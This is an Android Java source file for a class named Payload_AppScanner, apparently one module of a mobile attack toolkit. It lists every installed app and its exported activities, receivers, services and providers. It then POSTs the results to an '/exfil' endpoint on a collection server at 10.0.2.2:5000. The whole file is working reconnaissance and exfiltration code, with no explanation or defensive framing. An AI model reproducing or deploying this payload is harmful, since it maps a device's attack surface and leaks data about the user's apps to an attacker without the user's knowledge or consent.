package payloads_source;

import android.content.pm.ActivityInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.ProviderInfo;
import android.content.pm.ServiceInfo;

public class Payload_AppScanner {
    public void execute(Context context) {
        PackageManager pm = context.getPackageManager();
        try {
            for (PackageInfo pkg : pm.getInstalledPackages(PackageManager.GET_ACTIVITIES | PackageManager.GET_RECEIVERS | PackageManager.GET_SERVICES | PackageManager.GET_PROVIDERS)) {
                StringBuilder sb = new StringBuilder();
                sb.append("Package: ").append(pkg.packageName).append("\n");

                if (pkg.activities != null) {
                    for (ActivityInfo ai : pkg.activities) {
                        if (ai.exported) sb.append("  [Activity] ").append(ai.name).append(" (exported)\n");
                    }
                }

                if (pkg.receivers != null) {
                    for (ActivityInfo ri : pkg.receivers) {
                        if (ri.exported) sb.append("  [Receiver] ").append(ri.name).append(" (exported)\n");
                    }
                }

                if (pkg.services != null) {
                    for (ServiceInfo si : pkg.services) {
                        if (si.exported) sb.append("  [Service] ").append(si.name).append(" (exported)\n");
                    }
                }

                if (pkg.providers != null) {
                    for (ProviderInfo pi : pkg.providers) {
                        if (pi.exported) sb.append("  [Provider] ").append(pi.name).append(" (exported)\n");
                    }
                }

                postResult(sb.toString());
            }
        } catch (Exception e) {
            postResult("[Error] " + e.getMessage());
        }
    }

    private void postResult(String data) {
        try {
            java.net.URL url = new java.net.URL("http://10.0.2.2:5000/exfil");
            java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "text/plain");

            java.io.OutputStream os = conn.getOutputStream();
            java.io.OutputStreamWriter writer = new java.io.OutputStreamWriter(os, "UTF-8");
            writer.write(data);
            writer.flush(); writer.close(); os.close();
            conn.getResponseCode();
        } catch (Exception ex) { ex.printStackTrace(); }
    }
}
